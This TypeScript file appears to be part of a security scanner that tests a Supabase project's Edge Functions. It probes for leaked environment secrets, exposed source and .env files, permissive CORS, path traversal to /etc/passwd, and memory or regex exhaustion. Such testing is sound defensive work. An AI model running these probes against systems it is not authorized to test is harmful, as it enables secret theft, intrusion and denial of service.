/**
 * Edge Functions Deep attacks
 * Tests for Supabase Edge Functions (Deno runtime) vulnerabilities
 */

import type { AttackVector } from '$lib/types/attacks';

export const edgeFunctionsDeepAttacks: AttackVector[] = [
	{
		id: 'edge-env-exposure',
		name: 'Environment Variable Exposure',
		description: 'Test for environment variable leakage in edge functions',
		category: 'functions',
		severity: 'critical',
		async execute(context) {
			try {
				// Common edge function names that might leak env vars
				const functions = ['debug', 'test', 'config', 'env', 'info', 'status'];
				const exposed: Array<{ fn: string; vars: string[] }> = [];

				for (const fn of functions) {
					const res = await fetch(
						`${context.supabaseUrl}/functions/v1/${fn}`,
						{
							headers: {
								'apikey': context.anonKey,
								'Authorization': `Bearer ${context.anonKey}`
							},
							signal: context.signal
						}
					);

					if (res.ok) {
						const data = await res.json();
						const text = JSON.stringify(data);

						// Check for env var patterns
						const envPatterns = [
							'SUPABASE_SERVICE_ROLE_KEY',
							'SUPABASE_DB_URL',
							'DATABASE_URL',
							'JWT_SECRET',
							'ANON_KEY',
							'SERVICE_ROLE'
						];

						const foundVars = envPatterns.filter(p => text.includes(p));
						if (foundVars.length > 0) {
							exposed.push({ fn, vars: foundVars });
						}
					}
				}

				return {
					breached: exposed.length > 0,
					status: exposed.length > 0 ? 'breached' : 'secure',
					summary: exposed.length > 0
						? `Environment variables exposed in: ${exposed.map(e => e.fn).join(', ')}`
						: 'Environment variables protected',
					evidence: exposed.length > 0 ? { exposed } : undefined
				};
			} catch {
				return { breached: false, status: 'secure', summary: 'Edge functions env protected' };
			}
		}
	},
	{
		id: 'edge-import-map-exploit',
		name: 'Import Map Manipulation',
		description: 'Test for import map manipulation attacks',
		category: 'functions',
		severity: 'high',
		async execute(context) {
			try {
				// Try to access import_map.json or similar config
				const configEndpoints = [
					'/functions/v1/import_map.json',
					'/functions/v1/_shared/import_map.json',
					'/functions/v1/deno.json',
					'/functions/v1/deno.jsonc'
				];

				for (const endpoint of configEndpoints) {
					const res = await fetch(
						`${context.supabaseUrl}${endpoint}`,
						{
							headers: {
								'apikey': context.anonKey,
								'Authorization': `Bearer ${context.anonKey}`
							},
							signal: context.signal
						}
					);

					if (res.ok) {
						const data = await res.json();
						return {
							breached: true,
							status: 'breached',
							summary: `Import map exposed at ${endpoint}`,
							evidence: { endpoint, importMap: data }
						};
					}
				}

				return {
					breached: false,
					status: 'secure',
					summary: 'Import maps not exposed'
				};
			} catch {
				return { breached: false, status: 'secure', summary: 'Import maps protected' };
			}
		}
	},
	{
		id: 'edge-cold-start-dos',
		name: 'Cold Start DoS Attack',
		description: 'Test if cold start can be exploited for DoS',
		category: 'functions',
		severity: 'medium',
		async execute(context) {
			try {
				// Measure cold start timing
				const timings: number[] = [];

				// Make several requests to potentially cold functions
				for (let i = 0; i < 5; i++) {
					const startTime = Date.now();

					await fetch(
						`${context.supabaseUrl}/functions/v1/cold-test-${Date.now()}`,
						{
							method: 'POST',
							headers: {
								'apikey': context.anonKey,
								'Authorization': `Bearer ${context.anonKey}`
							},
							signal: context.signal
						}
					);

					timings.push(Date.now() - startTime);
				}

				const avgTime = timings.reduce((a, b) => a + b, 0) / timings.length;
				const hasSlowColdStart = avgTime > 3000;

				return {
					breached: hasSlowColdStart,
					status: hasSlowColdStart ? 'breached' : 'secure',
					summary: hasSlowColdStart
						? `Slow cold start detected: avg ${Math.round(avgTime)}ms - potential DoS vector`
						: `Cold start timing acceptable: avg ${Math.round(avgTime)}ms`,
					evidence: { timings, average: avgTime }
				};
			} catch {
				return { breached: false, status: 'error', summary: 'Could not test cold start' };
			}
		}
	},
	{
		id: 'edge-memory-exhaustion',
		name: 'Memory Exhaustion Attack',
		description: 'Test for memory exhaustion vulnerabilities',
		category: 'functions',
		severity: 'high',
		async execute(context) {
			try {
				// Send large payload to test memory limits
				const largePayload = {
					data: 'x'.repeat(10 * 1024 * 1024) // 10MB string
				};

				const res = await fetch(
					`${context.supabaseUrl}/functions/v1/test`,
					{
						method: 'POST',
						headers: {
							'Content-Type': 'application/json',
							'apikey': context.anonKey,
							'Authorization': `Bearer ${context.anonKey}`
						},
						body: JSON.stringify(largePayload),
						signal: context.signal
					}
				);

				const acceptsLarge = res.ok || res.status !== 413;

				return {
					breached: acceptsLarge,
					status: acceptsLarge ? 'breached' : 'secure',
					summary: acceptsLarge
						? 'Large payloads accepted - memory exhaustion possible'
						: 'Payload size limits enforced',
					evidence: { status: res.status, payloadSize: '10MB' }
				};
			} catch {
				return { breached: false, status: 'secure', summary: 'Memory limits enforced' };
			}
		}
	},
	{
		id: 'edge-source-exposure',
		name: 'Function Source Code Exposure',
		description: 'Test if function source code can be accessed',
		category: 'functions',
		severity: 'critical',
		async execute(context) {
			try {
				const sourceEndpoints = [
					'/functions/v1/index.ts',
					'/functions/v1/main.ts',
					'/functions/v1/_shared/',
					'/functions/v1/src/',
					'/functions/v1/.env'
				];

				for (const endpoint of sourceEndpoints) {
					const res = await fetch(
						`${context.supabaseUrl}${endpoint}`,
						{
							headers: {
								'apikey': context.anonKey,
								'Authorization': `Bearer ${context.anonKey}`
							},
							signal: context.signal
						}
					);

					if (res.ok) {
						const contentType = res.headers.get('content-type') || '';
						if (contentType.includes('text') || contentType.includes('javascript')) {
							return {
								breached: true,
								status: 'breached',
								summary: `Source code exposed at ${endpoint}`,
								evidence: { endpoint, contentType }
							};
						}
					}
				}

				return {
					breached: false,
					status: 'secure',
					summary: 'Function source code protected'
				};
			} catch {
				return { breached: false, status: 'secure', summary: 'Source code not accessible' };
			}
		}
	},
	{
		id: 'edge-cors-bypass',
		name: 'Edge Function CORS Bypass',
		description: 'Test for permissive CORS on edge functions',
		category: 'functions',
		severity: 'medium',
		async execute(context) {
			try {
				const res = await fetch(
					`${context.supabaseUrl}/functions/v1/test`,
					{
						method: 'OPTIONS',
						headers: {
							'Origin': 'https://evil-attacker.com',
							'Access-Control-Request-Method': 'POST',
							'apikey': context.anonKey
						},
						signal: context.signal
					}
				);

				const allowOrigin = res.headers.get('access-control-allow-origin');
				const allowCredentials = res.headers.get('access-control-allow-credentials');

				const hasWildcard = allowOrigin === '*';
				const reflectsOrigin = allowOrigin === 'https://evil-attacker.com';
				const credentialsWithWildcard = hasWildcard && allowCredentials === 'true';

				return {
					breached: hasWildcard || reflectsOrigin || credentialsWithWildcard,
					status: hasWildcard || reflectsOrigin ? 'breached' : 'secure',
					summary: hasWildcard
						? 'CORS allows all origins (*)'
						: reflectsOrigin
							? 'CORS reflects arbitrary origins'
							: 'CORS properly configured',
					evidence: { allowOrigin, allowCredentials }
				};
			} catch {
				return { breached: false, status: 'error', summary: 'Could not test CORS' };
			}
		}
	},
	{
		id: 'edge-path-traversal',
		name: 'Path Traversal in Edge Functions',
		description: 'Test for path traversal vulnerabilities',
		category: 'functions',
		severity: 'critical',
		async execute(context) {
			try {
				const traversalPayloads = [
					'../../../etc/passwd',
					'..%2F..%2F..%2Fetc%2Fpasswd',
					'....//....//....//etc/passwd',
					'%2e%2e/%2e%2e/%2e%2e/etc/passwd'
				];

				for (const payload of traversalPayloads) {
					const res = await fetch(
						`${context.supabaseUrl}/functions/v1/${payload}`,
						{
							headers: {
								'apikey': context.anonKey,
								'Authorization': `Bearer ${context.anonKey}`
							},
							signal: context.signal
						}
					);

					if (res.ok) {
						const text = await res.text();
						if (text.includes('root:') || text.includes('/bin/')) {
							return {
								breached: true,
								status: 'breached',
								summary: 'Path traversal successful!',
								evidence: { payload, response: text.substring(0, 200) }
							};
						}
					}
				}

				return {
					breached: false,
					status: 'secure',
					summary: 'Path traversal attacks blocked'
				};
			} catch {
				return { breached: false, status: 'secure', summary: 'Path traversal not possible' };
			}
		}
	},
	{
		id: 'edge-timeout-abuse',
		name: 'Function Timeout Abuse',
		description: 'Test if function timeout can be abused',
		category: 'functions',
		severity: 'medium',
		async execute(context) {
			try {
				// Try to trigger long-running operation
				const startTime = Date.now();

				const res = await fetch(
					`${context.supabaseUrl}/functions/v1/test`,
					{
						method: 'POST',
						headers: {
							'Content-Type': 'application/json',
							'apikey': context.anonKey,
							'Authorization': `Bearer ${context.anonKey}`
						},
						body: JSON.stringify({
							// Payload that might cause slow processing
							iterations: 999999999,
							sleep: 60000,
							regex: '(a+)+$',
							input: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!'
						}),
						signal: context.signal
					}
				);

				const elapsed = Date.now() - startTime;
				const longRunning = elapsed > 10000;

				return {
					breached: longRunning,
					status: longRunning ? 'breached' : 'secure',
					summary: longRunning
						? `Function ran for ${elapsed}ms - timeout abuse possible`
						: `Function timeout properly enforced (${elapsed}ms)`,
					evidence: { elapsed }
				};
			} catch {
				return { breached: false, status: 'secure', summary: 'Function timeout enforced' };
			}
		}
	}
];
